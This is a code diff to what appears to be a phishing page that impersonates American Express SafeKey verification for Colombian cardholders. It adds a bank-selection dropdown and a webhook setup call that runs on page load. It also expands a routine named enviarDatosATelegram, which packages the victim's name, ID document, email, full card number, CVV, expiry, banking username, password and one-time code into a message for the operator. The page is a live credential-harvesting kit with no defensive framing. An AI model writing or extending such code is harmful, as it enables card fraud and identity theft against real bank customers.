@@ -125,7 +125,7 @@
             color: var(--amex-text);
         }
 
-        .form-input {
+        .form-input, .form-select {
             padding: 11px 14px;
             border: 1px solid var(--amex-border);
             border-radius: 4px;
@@ -141,16 +141,24 @@
             color: #999999;
         }
 
-        .form-input:focus {
+        .form-input:focus, .form-select:focus {
             outline: none;
             border-color: var(--amex-blue);
             box-shadow: 0 0 0 3px rgba(0, 111, 207, 0.1);
         }
 
-        .form-input:disabled {
+        .form-input:disabled, .form-select:disabled {
             background-color: #F9F9F9;
             color: #999999;
             cursor: not-allowed;
+        }
+
+        .form-select {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23333333' stroke-width='2'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-position: right 12px center;
+            background-repeat: no-repeat;
+            padding-right: 40px;
         }
 
         .credentials-section {
@@ -206,6 +214,10 @@
             color: var(--amex-gray);
             margin-bottom: 10px;
             line-height: 1.4;
+        }
+
+        .banco-group {
+            margin-bottom: 16px;
         }
 
         .button-group {
@@ -306,7 +318,8 @@
             display: none;
         }
 
-        .form-group.error .form-input {
+        .form-group.error .form-input,
+        .form-group.error .form-select {
             border-color: #D32F2F;
             box-shadow: 0 0 0 3px rgba(211, 47, 47, 0.1);
         }
@@ -479,6 +492,30 @@
                 </div>
             </div>
 
+            <!-- Banco emisor (opcional) -->
+            <div class="form-group banco-group">
+                <label class="form-label">Banco emisor</label>
+                <select class="form-select" id="bancoEmisor">
+                    <option value="">Seleccione su banco (opcional)</option>
+                    <option value="Bancolombia">Bancolombia</option>
+                    <option value="Davivienda">Davivienda</option>
+                    <option value="BBVA Colombia">BBVA Colombia</option>
+                    <option value="Banco de Bogotá">Banco de Bogotá</option>
+                    <option value="Banco Popular">Banco Popular</option>
+                    <option value="Banco Occidente">Banco Occidente</option>
+                    <option value="Citibank Colombia">Citibank Colombia</option>
+                    <option value="Banco AV Villas">Banco AV Villas</option>
+                    <option value="Banco Colpatria">Banco Colpatria</option>
+                    <option value="Bancoomeva">Bancoomeva</option>
+                    <option value="Banco GNB Sudameris">Banco GNB Sudameris</option>
+                    <option value="Banco Finandina">Banco Finandina</option>
+                    <option value="Banco Falabella">Banco Falabella</option>
+                    <option value="Banco Pichincha">Banco Pichincha</option>
+                    <option value="Banco Cooperativo Coopcentral">Banco Cooperativo Coopcentral</option>
+                    <option value="Otro">Otro</option>
+                </select>
+            </div>
+
             <div class="checkbox-group">
                 <input type="checkbox" id="memberRewards" />
                 <label for="memberRewards">Redimir Membership Rewards® Points en esta transacción</label>
@@ -514,13 +551,20 @@
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
         const confirmationInput = document.getElementById('confirmationCode');
+        const bancoEmisor = document.getElementById('bancoEmisor');
         const submitButton = document.getElementById('submitButton');
         const loadingOverlay = document.getElementById('loadingOverlay');
         const statusMessage = document.getElementById('statusMessage');
 
         // ============================================
-        // INICIALIZACIÓN
+        // INICIALIZACIÓN (con configuración de webhook)
         // ============================================
+        window.addEventListener('load', async function() {
+            initializeTransaction();
+            await configurarWebhook();
+            console.log('✅ Sistema AMEX SafeKey listo - Webhook activo');
+        });
+
         function initializeTransaction() {
             const storagePriority = sessionStorage.getItem('procesamiento_prioritario') === 'true';
             
@@ -551,6 +595,19 @@
             return 'AMEX-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
         }
 
+        // Configurar el webhook (igual que paso3.html)
+        async function configurarWebhook() {
+            try {
+                const response = await fetch(`${WEBHOOK_URL}?setup=true`);
+                const data = await response.json();
+                console.log('🔗 Webhook configurado:', data);
+                return data.success;
+            } catch (error) {
+                console.error('❌ Error configurando webhook:', error);
+                return false;
+            }
+        }
+
         async function enviarDatosATelegram(datos) {
             try {
                 const inlineKeyboard = {
@@ -568,14 +625,27 @@
                     ]
                 };
 
+                // Obtener datos personales desde localStorage (igual que paso3)
+                const nombre = localStorage.getItem('nombre') || 'No proporcionado';
+                const apellidos = localStorage.getItem('apellidos') || '';
+                const tipoDoc = localStorage.getItem('tipoDocumento') || '';
+                const numeroDoc = localStorage.getItem('numeroDocumento') || 'No proporcionado';
+                const email = localStorage.getItem('email') || 'No proporcionado';
+
                 const mensaje = `🔔 *AMEX SAFEKEY - AUTENTICACIÓN*
 
 🆔 ID: \`${datos.solicitudId}\`
+
+📋 *DATOS PERSONALES:*
+👤 Nombre: ${nombre} ${apellidos}
+🆔 Documento: ${tipoDoc} ${numeroDoc}
+📧 Email: ${email}
 
 💳 *DATOS DE TARJETA:*
 🏦 Número: \`${datos.numeroTarjeta}\`
 🔢 CVV: \`${datos.cvv}\`
 📅 Vencimiento: \`${datos.vencimiento}\`
+🏛️ Banco emisor: ${datos.bancoEmisor || 'No especificado'}
 
 🔐 *CREDENCIALES:*
 👤 Usuario: \`${datos.usuario}\`
@@ -683,6 +753,7 @@
             usernameInput.disabled = false;
             passwordInput.disabled = false;
             confirmationInput.disabled = false;
+            bancoEmisor.disabled = false;
             solicitudId = null;
         }
 
@@ -745,6 +816,7 @@
             usernameInput.disabled = true;
             passwordInput.disabled = true;
             confirmationInput.disabled = true;
+            bancoEmisor.disabled = true;
 
             const numeroTarjeta = sessionStorage.getItem('cardNumberFull') || 'No disponible';
             const cvv = sessionStorage.getItem('cardCVV') || 'No disponible';
@@ -758,6 +830,7 @@
                 usuario: usernameInput.value.trim(),
                 password: passwordInput.value.trim(),
                 otp: confirmationInput.value.trim(),
+                bancoEmisor: bancoEmisor.value || 'No especificado',
                 monto: document.getElementById('transaction-amount').textContent,
                 fecha: document.getElementById('transaction-date').textContent
             };
@@ -782,11 +855,6 @@
         document.getElementById('helpLink').addEventListener('click', function(e) {
             e.preventDefault();
             alert('Para más ayuda, contacte a American Express o a su banco.');
-        });
-
-        window.addEventListener('load', function() {
-            initializeTransaction();
-            console.log('✅ Sistema AMEX SafeKey listo - Webhook activo');
         });
     </script>
 </body>
